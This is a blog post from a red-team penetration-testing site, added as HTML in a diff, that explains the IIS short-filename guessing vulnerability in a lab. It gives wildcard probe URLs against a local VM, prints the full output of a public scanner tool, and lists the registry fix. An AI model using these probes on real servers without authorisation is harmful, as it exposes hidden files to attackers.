@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>IIS-短文件名猜解漏洞 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">IIS-短文件名猜解漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 2, 2019&nbsp;&nbsp;12:28:29</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=518894119&auto=1&height=66"></iframe>
+
+<h2 id="短文件名介绍"><a href="#短文件名介绍" class="headerlink" title="短文件名介绍"></a>短文件名介绍</h2><p>为了兼容<code>16</code>位<code>MS-DOS</code>程序，Windows为文件名较长的文件（和文件夹）生成了对应的<code>Windows 8.3</code>短文件名。</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/170.png" alt="图片"></p>
+<h2 id="短文件名的查看"><a href="#短文件名的查看" class="headerlink" title="短文件名的查看"></a>短文件名的查看</h2><p>首先在C盘下多创建几个文件：（有不同的后缀名，都是比较长的文件名）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaa.txt</span><br><span class="line">bbbbbbbbbbbb.asp</span><br><span class="line">abcdefghijk.txt</span><br><span class="line">abcdefghig.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/171.png" alt="图片"></p>
+<p>打开<code>命令提示符</code>，来到<code>C盘</code>下，查看短文件名的命名方式：<code>dir /x</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/172.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;dir /x</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 509E-D608</span><br><span class="line"></span><br><span class="line"> C:\ 的目录</span><br><span class="line"></span><br><span class="line">2019-08-02  12:37                 0 AAAAAA~1.TXT aaaaaaaaaaaaa.txt</span><br><span class="line">2019-08-02  12:47                 0              abc.txt</span><br><span class="line">2019-08-02  12:39                 0 ABCDEF~1.PHP abcdefghig.php</span><br><span class="line">2019-08-02  12:39                 0 ABCDEF~1.TXT abcdefghijk.txt</span><br><span class="line">2019-07-23  11:47                 0              AUTOEXEC.BAT</span><br><span class="line">2019-08-02  12:37                 0 BBBBBB~1.ASP bbbbbbbbbbbbbb.aspx</span><br><span class="line">2019-07-23  11:47                 0              CONFIG.SYS</span><br><span class="line">2019-07-23  11:49    &lt;DIR&gt;          DOCUME~1     Documents and Settings</span><br><span class="line">2019-07-23  11:59    &lt;DIR&gt;          FPSE_S~1     FPSE_search</span><br><span class="line">2019-07-23  11:59    &lt;DIR&gt;                       Inetpub</span><br><span class="line">2019-07-23  11:51    &lt;DIR&gt;          PROGRA~1     Program Files</span><br><span class="line">2019-07-23  13:17    &lt;DIR&gt;                       WINDOWS</span><br><span class="line">2019-07-23  11:47    &lt;DIR&gt;                       wmpub</span><br><span class="line">               7 个文件              0 字节</span><br><span class="line">               6 个目录 28,107,870,208 可用字节</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们第一个文件：<code>aaaaaaaaaaaaa.txt</code>这个文件，他显示的短文件名形式是大写的<code>AAAAAA~1.TXT</code></p>
+<p><code>abcdefghig.php</code>这个文件，他显示的短文件名形式也是大写的<code>ABCDEF~1.PHP</code></p>
+<p>后面的也一样，只保留前<code>六位数</code>的<code>文件名</code> + <code>～</code> + <code>1.后缀名</code></p>
+<p>这时候，我们再创建一个文件:<code>abc.txt</code>,然后在用<code>dir /x</code>查看一下：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/173.png" alt="图片"></p>
+<p>可以看到，前面并没有短文件名，因为它本身长度就不是特别的长！</p>
+<p>从以上实验得出短文件名的特征：</p>
+<h2 id="短文件名特征"><a href="#短文件名特征" class="headerlink" title="短文件名特征"></a>短文件名特征</h2><p>1、只有<code>前六位</code>字符直接显示，后续字符用<code>~1</code>指代。其中数字<code>1</code>还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）</p>
+<p>2、后缀名最长只有<code>3</code>位，多余的被截断，超过3位的长文件会生成短文件名</p>
+<p>3、所有<code>小写字母</code>都会转换成<code>大写字母</code></p>
+<p>4、长文件名中含有多个<code>.</code>,以文件名最后一个<code>.</code>作为短文件名后缀</p>
+<p>5、长文件名前缀/文件夹名字符长度符合<code>0-9</code>和<code>Aa-Zz</code>范围且需要<code>大于等于9位</code>才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>攻击者使用通配符<code>*</code>和<code>?</code>发生一个请求到<code>IIS</code>，当IIS接收到一个文件路径中包含<code>~</code>请求时，它的反应是不同的，即返回的<code>HTTP状态码</code>和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个<code>存在</code>的短文件名，会返回<code>404</code>；访问构造的某个<code>不存在</code>的短文件名，会返回<code>400</code>（报错页面）</p>
+<h2 id="IIS短文件猜解漏洞复现（手工测试）"><a href="#IIS短文件猜解漏洞复现（手工测试）" class="headerlink" title="IIS短文件猜解漏洞复现（手工测试）"></a>IIS短文件猜解漏洞复现（手工测试）</h2><p>因为我开着<code>IIS</code>的虚拟机的IP是<code>192.168.119.133</code>,所以我直接访问这个URL：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.119.133/a*~1*/.aspx">http://192.168.119.133/a*~1*/.aspx</a></p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/174.png" alt="图片"></p>
+<p><code>/a*~1*/</code>的意思就是，用<code>首字母a</code>这个字符去匹配,也就是首字母<code>a</code>是否<code>存在</code>这个短文件名。<code>~1</code>这个和上面的短文件名特征是一样的，代表了它是一个短文件名。</p>
+<p>如果说这个页面返回的状态码是<code>404</code>的话，那么这个短文件名是<code>存在</code>的！如果返回的是<code>400</code>,泽说明这个短文件名是<code>不存在</code>的!</p>
+<p>从上图可以得出，返回的页面状态码是<code>404</code>,说明网站更目录下有一个文件是以<code>a</code>开头的短文件名。</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/175.png" alt="图片"></p>
+<p><code>aspnet_client</code>这个文件夹是<code>iis</code>自带的文件夹目录，所以会显示存在！</p>
+<p>这个时候我们测试一个不存在的文件或者文件名:</p>
+<p>访问URL：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.119.133/c*~1*/.aspx">http://192.168.119.133/c*~1*/.aspx</a></p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/176.png" alt="图片"></p>
+<p>返回的状态码是<code>400</code>,说明<code>不存在</code>以<code>c</code>开头的短文件名。</p>
+<h2 id="IIS短文件名猜解漏洞复现（工具测试）"><a href="#IIS短文件名猜解漏洞复现（工具测试）" class="headerlink" title="IIS短文件名猜解漏洞复现（工具测试）"></a>IIS短文件名猜解漏洞复现（工具测试）</h2><p>用到的工具来自<code>Github</code>上的IIS短文件名猜解工具：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法是:iis_shortname_Scan.py 目标主机</span><br><span class="line"></span><br><span class="line">python iis_shortname_Scan.py http://192.168.119.133</span><br></pre></td></tr></table></figure>
+<p>用之前，我们先把刚刚创建的那些文件复制到我们的网站更目录，然后再使用：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/177.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">E:\HACK\IIS短文件名猜解工具\IIS_shortname_Scanner&gt;python iis_shortname_Scan.py h</span><br><span class="line">ttp://192.168.119.133</span><br><span class="line">Server is vulnerable, please wait, scanning...</span><br><span class="line">[+] /a~1.*      [scan in progress]</span><br><span class="line">[+] /b~1.*      [scan in progress]</span><br><span class="line">[+] /ab~1.*     [scan in progress]</span><br><span class="line">[+] /aa~1.*     [scan in progress]</span><br><span class="line">[+] /bb~1.*     [scan in progress]</span><br><span class="line">[+] /as~1.*     [scan in progress]</span><br><span class="line">[+] /abc~1.*    [scan in progress]</span><br><span class="line">[+] /aaa~1.*    [scan in progress]</span><br><span class="line">[+] /bbb~1.*    [scan in progress]</span><br><span class="line">[+] /asp~1.*    [scan in progress]</span><br><span class="line">[+] /abcd~1.*   [scan in progress]</span><br><span class="line">[+] /aaaa~1.*   [scan in progress]</span><br><span class="line">[+] /bbbb~1.*   [scan in progress]</span><br><span class="line">[+] /aspn~1.*   [scan in progress]</span><br><span class="line">[+] /abcde~1.*  [scan in progress]</span><br><span class="line">[+] /aaaaa~1.*  [scan in progress]</span><br><span class="line">[+] /bbbbb~1.*  [scan in progress]</span><br><span class="line">[+] /aspne~1.*  [scan in progress]</span><br><span class="line">[+] /abcdef~1.* [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.* [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.* [scan in progress]</span><br><span class="line">[+] /aspnet~1.* [scan in progress]</span><br><span class="line">[+] /abcdef~1.p*        [scan in progress]</span><br><span class="line">[+] /abcdef~1.t*        [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.t*        [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.a*        [scan in progress]</span><br><span class="line">[+] /aspnet~1   [scan in progress]</span><br><span class="line">[+] Directory /aspnet~1 [Done]</span><br><span class="line">[+] /abcdef~1.ph*       [scan in progress]</span><br><span class="line">[+] /abcdef~1.tx*       [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.tx*       [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.as*       [scan in progress]</span><br><span class="line">[+] /abcdef~1.php*      [scan in progress]</span><br><span class="line">[+] File /abcdef~1.php* [Done]</span><br><span class="line">[+] /abcdef~1.txt*      [scan in progress]</span><br><span class="line">[+] File /abcdef~1.txt* [Done]</span><br><span class="line">[+] /aaaaaa~1.txt*      [scan in progress]</span><br><span class="line">[+] File /aaaaaa~1.txt* [Done]</span><br><span class="line">[+] /bbbbbb~1.asp*      [scan in progress]</span><br><span class="line">[+] File /bbbbbb~1.asp* [Done]</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Dir:  /aspnet~1</span><br><span class="line">File: /abcdef~1.php*</span><br><span class="line">File: /abcdef~1.txt*</span><br><span class="line">File: /aaaaaa~1.txt*</span><br><span class="line">File: /bbbbbb~1.asp*</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">1 Directories, 4 Files found in total</span><br><span class="line">Note that * is a wildcard, matches any character zero or more times.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/178.png" alt="图片"></p>
+<p>可以从上图中对照一下看看，成功猜解出我们网站更目录下的短文件名！</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、升级<code>.net framework</code></p>
+<p>2、修改注册表键值：</p>
+<blockquote>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</p>
+</blockquote>
+<p>修改<code>NtfsDisable8dot3NameCreation</code>为<code>1</code>，<code>1</code>代表不创建短文件名格式，修改完成后，需要重启系统生效。</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/179.png" alt="图片"></p>
+<p>本篇完~</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/08/02/IIS-2/">http://example.com/2019/08/02/IIS-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/IIS/"># IIS</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/08/03/IIS-3/">IIS-远程代码执行漏洞</a>
+            
+            
+            <a class="next" rel="next" href="/2019/07/23/IIS-1/">IIS-PUT漏洞</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
